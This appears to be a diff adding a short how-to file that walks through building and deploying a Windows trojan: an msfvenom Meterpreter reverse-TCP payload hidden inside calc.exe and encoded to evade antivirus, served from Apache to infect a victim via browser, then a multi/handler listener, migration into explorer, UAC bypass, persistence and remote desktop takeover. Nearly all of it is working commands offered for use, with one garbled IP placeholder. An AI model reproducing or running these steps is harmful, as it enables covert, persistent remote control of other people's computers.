@@ -1,0 +1,46 @@
+Kali has these tools built in.
+
+Step 1:	create Trojan, you need an exe file to import into msfvenom. (I used windows calculator)
+
+/**
+ *	LHOST= attacking machines local ip  LPORT= listening port on attack machine
+ */
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx.xxx LPORT=2020 -x calc.exe -k -e x86/shikata_ga_nai -i 10 -f exe > /var/www/calculator.exe
+
+Step 2:	
+
+	start msfconsole
+	Use exploit/multi/handler
+	Set PAYLOAD windows/meterpreter/reverse_tcp
+	Set LHOST xxx.xxx.xxx.xxx
+	Set LPORT 2020
+	Exploit 
+
+Step 3:	
+
+	Start apache with Trojan in /var/www/html directory
+	Infect machine via browser
+	Run calculator.exe
+
+Step 4:	get list of running processes, and switch to a windows running process. (i used explorer)
+
+	ps
+	Migrate xxxx (xxxx = explorer's pid#)
+
+/**
+ *	as long as the current process is running, the backdoor will be open
+ *  to make it persistent follow step 5
+ */
+
+Step 5:
+
+	set AutoRunScript exploit/windows/local/bypassuac LHOST=xxx.xxx.xxx.xxx LPORT=2020
+	Run persistence -u
+
+/**
+ *	have fun with remote desktop
+ */
+
+Meterpreter > run getgui -u username -p password
+Meterpreter > rdesktop -u username -p password 
